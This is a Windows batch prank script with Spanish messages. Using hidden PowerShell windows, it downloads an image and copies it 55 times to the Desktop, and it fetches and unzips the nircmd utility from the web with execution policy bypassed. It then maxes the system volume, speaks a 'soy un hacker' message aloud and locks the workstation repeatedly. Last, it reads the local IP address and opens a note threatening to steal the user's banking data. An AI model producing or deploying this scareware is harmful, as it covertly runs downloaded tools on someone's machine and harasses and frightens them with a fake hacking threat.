@echo off

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg' -OutFile \"$env:TEMP\kaliseParaTodos.png\""

start "" "https://pbs.twimg.com/media/CG_6R6hXAAEnowm.jpg"

powershell -WindowStyle Hidden -Command "for ($i = 1; $i -le 55; $i++) { Copy-Item -Path \"$env:TEMP\kaliseParaTodos.png\" -Destination \"C:\Users\$env:USERNAME\Desktop\kaliseParaTodos$i.png\" }"

set "NIR=%TEMP%\nircmd.exe"

if not exist "%NIR%" (
    powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://www.nirsoft.net/utils/nircmd.zip' -OutFile \"$env:TEMP\nircmd.zip\"; Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory(\"$env:TEMP\nircmd.zip\", \"$env:TEMP\")"
)

"%NIR%" mutesysvolume 0
"%NIR%" setsysvolume 65535

powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName System.Speech; $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer; $speak.Volume = 100; $speak.Speak('Hola, soy un hacker. Tengo un windows en un mac. KALISE PARA TODOS. Quien quiere un kalise???');"

rundll32.exe user32.dll,LockWorkStation

"%NIR%" mutesysvolume 0
"%NIR%" setsysvolume 65535

start "" "https://www.youtube.com/watch?v=2iMQcqGK8yg"

timeout /t 10 /nobreak >nul

"%NIR%" mutesysvolume 0
"%NIR%" setsysvolume 65535

rundll32.exe user32.dll,LockWorkStation

setlocal enabledelayedexpansion

ipconfig | findstr /i "IPv4" > "%TEMP%\ipline.txt"

set "IP="
for /f "usebackq delims=" %%L in ("%TEMP%\ipline.txt") do (
    set "linea=%%L"
    set "IP=!linea:~-15!"
)

set "IP=%IP: =%"

set "FILE=%TEMP%\mi_ip.txt"
echo %USERNAME%, se que eres fan de Iniesta. Yo tambien, pero ahora que tengo tu ip %IP% te voy a robar los datos bancarios > "%FILE%"
start notepad "%FILE%"

@REM prueba